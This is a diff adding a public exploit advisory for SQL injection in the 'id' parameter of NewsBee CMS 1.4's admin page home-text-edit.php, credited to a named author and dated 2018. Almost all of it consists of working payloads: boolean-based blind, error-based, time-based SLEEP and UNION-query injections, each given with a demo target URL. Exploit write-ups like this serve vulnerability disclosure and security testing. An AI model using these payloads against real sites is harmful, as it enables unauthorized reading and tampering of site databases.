@@ -1,0 +1,39 @@
+# Exploit Title: NewsBee CMS 1.4 - 'home-text-edit.php' SQL Injection
+# Dork: N/A
+# Date: 2018-05-22
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/newsbee-fully-featured-news-cms-with-bootstrasp-php-mysql/19404937
+# Version: 1.4 / fourth update
+# Category: Webapps
+# Tested on: Kali linux
+
+# PoC: SQLi:
+# Parameter: id
+# Type: boolean-based blind
+# Demo: http://Target/NewsBee/admin/home-text-edit.php?id=5
+# Payload: 
+
+iPayload: id=5' AND 3563=3563 AND 'HmOW'='HmOW
+
+# Type: error-based
+# Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+# Payload: 
+
+id=5' AND (SELECT 7446 FROM(SELECT
+COUNT(*),CONCAT(0x7178707871,(SELECT
+(ELT(7446=7446,1))),0x7176716a71,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'rNYc'='rNYc
+
+# Type: AND/OR time-based blind
+# Demo: http://Target/NewsBee/admin/home-text-edit.php?id=5
+# Payload: 
+
+id=5' AND SLEEP(5) AND 'KdYd'='KdYd
+
+# Type: UNION query
+# Demo: http://Target/NewsBee/admin/home-text-edit.php?id=5
+# Payload: 
+
+id=-1714' UNION ALL SELECT
+NULL,NULL,CONCAT(0x7162787871,0x51487655536a566c616e5156496a6a56426267495670596f644f466f554753504469636d4358694c,0x71766a7871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+WSZd&t=gallery
